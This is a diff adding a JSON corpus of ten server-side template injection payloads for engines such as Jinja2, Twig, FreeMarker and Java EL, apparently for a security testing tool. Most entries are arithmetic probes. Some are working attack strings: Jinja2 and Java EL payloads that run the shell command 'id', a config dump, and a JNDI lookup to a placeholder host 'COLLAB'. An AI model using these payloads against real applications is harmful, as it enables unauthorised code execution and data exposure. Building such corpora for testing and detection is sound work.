@@ -1,0 +1,18 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-WEB-SSTI",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
+  "payloads": [
+    { "payload_id": "PL-WEB-SSTI-0001", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "jinja2", "payload": "{{7*7}}", "severity": "medium", "tags": ["probe"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSTI-0002", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "jinja2", "payload": "{{config.items()}}", "severity": "high", "tags": ["config"], "classification": "T1" },
+    { "payload_id": "PL-WEB-SSTI-0003", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "jinja2", "payload": "{{request.application.__self__.__init__.__globals__['os'].popen('id').read()}}", "severity": "critical", "tags": ["rce"], "classification": "T2" },
+    { "payload_id": "PL-WEB-SSTI-0004", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "twig", "payload": "{{7*'7'}}", "severity": "medium", "tags": ["probe"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSTI-0005", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "freemarker", "payload": "${7*7}", "severity": "medium", "tags": ["probe"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSTI-0006", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "velocity", "payload": "#set($x=7*7)$x", "severity": "medium", "tags": ["probe"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSTI-0007", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "erb", "payload": "<%= 7*7 %>", "severity": "medium", "tags": ["probe"], "classification": "T0" },
+    { "payload_id": "PL-WEB-SSTI-0008", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "handlebars", "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{this.[...string].constructor...}}", "severity": "critical", "tags": ["rce", "proto-pollution"], "classification": "T2" },
+    { "payload_id": "PL-WEB-SSTI-0009", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "generic", "payload": "${jndi:ldap://COLLAB/a}", "severity": "critical", "tags": ["jndi", "log4shell"], "classification": "T2" },
+    { "payload_id": "PL-WEB-SSTI-0010", "cwe_id": "CWE-1336", "context": "template", "surface": "parameter", "engine": "el", "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "severity": "critical", "tags": ["rce", "java-el"], "classification": "T2" }
+  ]
+}
